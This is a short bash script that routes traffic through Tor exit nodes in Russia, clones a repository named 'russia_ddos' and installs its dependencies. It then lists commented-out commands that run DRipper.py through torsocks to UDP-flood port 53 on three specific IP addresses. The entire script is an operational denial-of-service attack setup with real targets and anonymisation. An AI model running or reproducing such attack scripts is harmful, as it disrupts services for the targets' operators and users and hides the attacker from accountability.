#!/bin/bash

echo "ExitNodes {ru}">> /etc/tor/torrc
echo "StrictNodes 1" >> /etc/tor/torrc
service tor restart

git clone git@github.com:alexmon1989/russia_ddos.git
cd russia_ddos
pip3 install -r requirements.txt


#torsocks -P 9050 python3 DRipper.py -s 217.175.155.100 -p 53 -t 135 -m udp
#torsocks -P 9050 python3 DRipper.py -s 217.175.155.12 -p 53 -t 135 -m udp
#torsocks -P 9050 python3 DRipper.py -s 217.175.140.71 -p 53 -t 135 -m udp
